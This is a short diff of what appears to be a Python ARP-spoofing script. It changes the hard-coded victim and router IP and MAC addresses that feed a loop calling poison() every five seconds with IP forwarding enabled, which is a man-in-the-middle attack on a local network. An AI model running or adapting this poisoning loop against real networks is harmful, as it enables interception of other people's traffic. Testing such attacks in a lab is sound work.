@@ -15,9 +15,9 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
 ip_forwarding.enable()
 
 while True:
-    victimIP="192.168.1.2"
-    routerIP="192.168.1.1"
-    victimMAC="00:26:b9:cf:7d:b3"
-    routerMAC="08:26:b9:cf:7d:b8"
+    victimIP="192.168.1.105"
+    routerIP="192.168.1.106"
+    victimMAC="08:00:27:5e:53:45"
+    routerMAC="08:00:27:34:0f:15"
     poison(routerIP,victimIP,routerMAC,victimMAC)
     time.sleep(5)
